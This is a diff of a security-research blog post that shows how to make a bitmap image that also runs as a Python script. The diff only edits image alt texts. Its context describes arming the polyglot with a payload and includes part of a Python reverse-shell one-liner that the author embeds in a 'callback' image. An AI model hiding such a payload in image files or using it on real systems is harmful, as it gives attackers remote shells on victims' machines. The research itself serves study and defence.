@@ -107,11 +107,11 @@ The interesting bits (heh) to pay attention here is the magic bytes in the heade
 
 Because I will go out of my way to use vim, I figured I could use it as a hex editor if I used `:%!xxd`. Utilizing this we are able to see it in a much more "editable friendly" manner: 
 
-{{< image src="/img/python_polyglots/polyglot_vim_2.png" alt="Vim output" position="center" style="width: 700px; height:auto;" >}}
+{{< image src="/img/python_polyglots/polyglot_vim_2.png" alt="Vim output 2: 2Hex2Furious" position="center" style="width: 700px; height:auto;" >}}
 
 Utilizing our Python knowledge, we modify the file size of the Bitmap to the ASCII characters: `=4;#`. But why tho?
 
-{{< image src="/img/python_polyglots/polyglot_vim_3.png" alt="Vim output" position="center" style="width: 700px; height:auto;" >}}
+{{< image src="/img/python_polyglots/polyglot_vim_3.png" alt="HELP I CAN'T EXIT VIM" position="center" style="width: 700px; height:auto;" >}}
 
 Well, recalling my side adventure into Python headers and comments and all that jazz, I realized that since the file size of the Bitmap could be altered, why not use it to create a rather weird Python variable declaration followed by a **STUPIDLY LONG** comment? In other words, to Python, the file now looks like:
 ```
@@ -122,11 +122,11 @@ So Python just thinks I am very verbose in my comments describing my variable `B
 ### Now what?
 With this, techncally our polyglot is complete. We just write our modified header to the original file in vim using `:%!xxd -r` and we `:x` to write the file and quit (`:wq` can go to hell. All my homies use `:x`). If I were to open this file, I would see that my art is still intact, and if I run `file` on this newly written file, which I renamed *"protect_ya_tech_modified_header.bmp*, my Mac thinks this is still a Bitmap:
 
-{{< image src="/img/python_polyglots/polyglot_vim_4.png" alt="Vim output" position="center" style="width: 700px; height:auto;" >}}
+{{< image src="/img/python_polyglots/polyglot_vim_4.png" alt="hah! nerd." position="center" style="width: 700px; height:auto;" >}}
 
 Of course our polyglot is not complete here, so far our Python "script" only declares a variable and has a long comment. To actually do something cool, we must "terminate" the comment with `0x0a 0x0d` and have our "new line" of code actually, y'know, execute code. 
 
-{{< image src="/img/python_polyglots/python_polyglot_1.png" alt="Writing the Polyglot in Python" position="center" style="width: 700px; height:auto;" >}}
+{{< image src="/img/python_polyglots/python_polyglot_1.png" alt="Write me like one of your Bitmaps" position="center" style="width: 700px; height:auto;" >}}
 
 For the research/testing/demo I decided to create a simple script as seen in the snippet above. I opened the *protect_ya_tech_modified_header.bmp* to read it as files, and read all the bytes into a variable called `data`. In order to "terminate" the comments in the data, I appended to `data` the bytes `\x0d\x0a` and then the bytes `print("Am I a python file or an image?")`. This print statement is our "payload" that is executed by the interpreter. I then wrote these bytes to a new file *protect_ya_tech_polyglot.bmp* and presto! The polyglot is now armed. 
 
@@ -150,7 +150,7 @@ import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 ```
 And I added this to my polyglot with the modified header and saved it to the aptly named *protect_ya_tech_polyglot_callback.bmp*:
 
-{{< image src="/img/python_polyglots/python_polyglot_2.png" alt="Writing the Polyglot in Python" position="center" style="width: 700px; height:auto;" >}}
+{{< image src="/img/python_polyglots/python_polyglot_2.png" alt="I ain't no callaback gurrrrl" position="center" style="width: 700px; height:auto;" >}}
 
 Soooooo now to test it!
 
